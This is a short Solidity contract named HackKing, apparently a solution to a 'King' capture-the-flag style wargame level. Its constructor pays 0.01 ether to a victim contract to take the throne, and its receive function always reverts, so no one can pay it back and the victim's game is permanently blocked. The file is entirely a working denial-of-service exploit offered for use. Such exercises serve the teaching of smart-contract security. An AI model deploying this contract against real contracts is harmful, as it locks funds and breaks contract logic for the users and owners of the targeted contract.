pragma solidity ^0.6.0;

contract HackKing {

    constructor(address _victim) public payable {
        _victim.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}